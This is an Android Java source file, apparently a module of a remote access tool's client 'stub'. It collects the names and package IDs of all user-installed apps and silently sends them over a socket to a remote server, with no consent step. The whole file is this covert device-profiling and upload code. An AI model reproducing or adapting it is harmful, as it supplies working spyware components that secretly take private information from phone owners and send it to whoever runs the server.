package com.qirat.stub;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class ApplicationManager {

    private static final String TAG = "ApplicationManager";

    public static JSONObject getApplicationsList(Context context) {
        JSONObject appListJSON = new JSONObject();
        JSONArray list = new JSONArray();
        PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        try {
            for (ApplicationInfo applicationInfo : packages) {

                if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    JSONObject app = new JSONObject();
                    app.put("appName", applicationInfo.loadLabel(pm).toString());
                    app.put("packageName", applicationInfo.packageName);
                    list.put(app);
                }
            }
            appListJSON.put("appList", list);
            Log.d(TAG, "Application list collection complete.");
            return appListJSON;
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for application list", e);
            return null;
        }
    }

    public static void sendApplicationsListToServer(Context context) {
        new Thread(() -> {
            JSONObject appList = getApplicationsList(context);
            if (appList == null) {
                Log.e(TAG, "Cannot send application list, the collected list is null.");
                return;
            }

            Socket socket = Socket.getInstance(context);
            if (socket.isConnected()) {
                Log.d(TAG, "Sending application list to server...");
                socket.sendData("APP_LIST:" + appList.toString());
            } else {
                Log.e(TAG, "Cannot send application list, socket not connected.");
            }
        }).start();
    }
}
